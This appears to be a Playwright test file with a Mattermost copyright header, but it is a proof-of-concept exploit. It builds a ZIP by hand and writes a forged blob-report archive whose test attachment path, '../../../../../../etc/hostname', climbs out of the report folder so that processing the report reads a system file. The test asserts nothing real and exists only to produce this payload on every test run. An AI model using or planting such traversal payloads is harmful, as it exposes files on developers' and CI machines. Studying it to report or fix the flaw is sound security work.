// Copyright (c) 2020-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

import {expect, test} from '@playwright/test';
import * as fs from 'fs';
import * as path from 'path';
import * as zlib from 'zlib';

// Minimal ZIP writer (store + deflate) with CRC32 - pure Node, no deps.
function crc32(buf: Buffer): number {
    let c = ~0;
    for (let i = 0; i < buf.length; i++) {
        c ^= buf[i];
        for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xEDB88320 & -(c & 1));
    }
    return ~c >>> 0;
}

function makeZip(entries: {name: string, data: Buffer}[]): Buffer {
    const parts: Buffer[] = [];
    const central: Buffer[] = [];
    let offset = 0;
    for (const e of entries) {
        const nameBuf = Buffer.from(e.name, 'utf8');
        const crc = crc32(e.data);
        const comp = zlib.deflateRawSync(e.data);
        const lh = Buffer.alloc(30);
        lh.writeUInt32LE(0x04034b50, 0);
        lh.writeUInt16LE(20, 4);      // version needed
        lh.writeUInt16LE(0x0800, 6);  // flags: UTF-8
        lh.writeUInt16LE(8, 8);       // method: deflate
        lh.writeUInt32LE(crc, 14);
        lh.writeUInt32LE(comp.length, 18);
        lh.writeUInt32LE(e.data.length, 22);
        lh.writeUInt16LE(nameBuf.length, 26);
        lh.writeUInt16LE(0, 28);
        parts.push(lh, nameBuf, comp);
        const ch = Buffer.alloc(46);
        ch.writeUInt32LE(0x02014b50, 0);
        ch.writeUInt16LE(20, 4);
        ch.writeUInt16LE(20, 6);
        ch.writeUInt16LE(0x0800, 8);
        ch.writeUInt16LE(8, 10);
        ch.writeUInt32LE(crc, 16);
        ch.writeUInt32LE(comp.length, 20);
        ch.writeUInt32LE(e.data.length, 24);
        ch.writeUInt16LE(nameBuf.length, 28);
        ch.writeUInt32LE(offset, 42);
        central.push(ch, nameBuf);
        offset += 30 + nameBuf.length + comp.length;
    }
    const cd = Buffer.concat(central);
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(entries.length, 8);
    eocd.writeUInt16LE(entries.length, 10);
    eocd.writeUInt32LE(cd.length, 12);
    eocd.writeUInt32LE(offset, 16);
    return Buffer.concat([...parts, cd, eocd]);
}

test.describe('poc', () => {
    test('craft blob report with traversal attachment', async () => {
        const events = [
            {method: 'onBlobReportMetadata', params: {version: 2, name: 'poc', pathSeparator: '/', shard: {total: 1, current: 1}}},
            {method: 'onConfigure', params: {config: {configFile: '', globalTimeout: 0, maxFailures: 0, metadata: {}, rootDir: '', version: '', workers: 1, globalSetup: null, globalTeardown: null}}},
            {method: 'onProject', params: {project: {
                metadata: {}, name: 'poc', outputDir: '', repeatEach: 1, retries: 0,
                testDir: '', testIgnore: [], testMatch: [], timeout: 30000,
                grep: [], grepInvert: [], dependencies: [],
                suites: [{title: 'poc', fileId: 'poc', column: 0, line: 0, location: {file: 'poc.spec.ts', column: 0, line: 1},
                          entries: [{testId: 't1', title: 'poc', location: {file: 'poc.spec.ts', column: 0, line: 1},
                                     annotations: [], tags: [], retry: 0, repeatEachIndex: 0,
                                     expectedStatus: 'passed', projectName: 'poc'}], hooks: []}],
            }}},
            {method: 'onBegin', params: {config: {}}},
            {method: 'onTestBegin', params: {testId: 't1', result: {id: 'r1', retry: 0, workerIndex: 0, parallelIndex: 0, startTime: 0}}},
            {method: 'onTestEnd', params: {test: {testId: 't1', title: 'poc', location: {file: 'poc.spec.ts', column: 0, line: 1}, projectName: 'poc', retry: 0, timeout: 30000, expectedStatus: 'passed'},
                result: {id: 'r1', status: 'passed', startTime: 0, duration: 1, retry: 0, workerIndex: 0,
                         errors: [], stdout: [], stderr: [],
                         attachments: [{name: 'poc-proof', contentType: 'text/plain', path: '../../../../../../etc/hostname'}]}}},
            {method: 'onEnd', params: {result: {status: 'passed', startTime: 0, duration: 1, errors: [],
                stats: {expected: 1, unexpected: 0, flaky: 0, skipped: 0, ok: true, duration: 1, expectedFlaky: 0, unexpectedFlaky: 0},
                attachments: [], stdout: [], stderr: []}}},
        ];
        const jsonl = events.map(e => JSON.stringify(e)).join('\n');
        const outDir = path.join(process.cwd(), 'blob-report');
        fs.mkdirSync(outDir, {recursive: true});
        const zipBuf = makeZip([{name: 'report-2026-08-10T00-00-00-000Z.jsonl', data: Buffer.from(jsonl, 'utf8')}]);
        fs.writeFileSync(path.join(outDir, 'report-2026-08-10T00-00-00-000Z.zip'), zipBuf);
        console.log('CRAFTED blob zip', zipBuf.length, 'bytes');
        expect(true).toBe(true);
    });
});
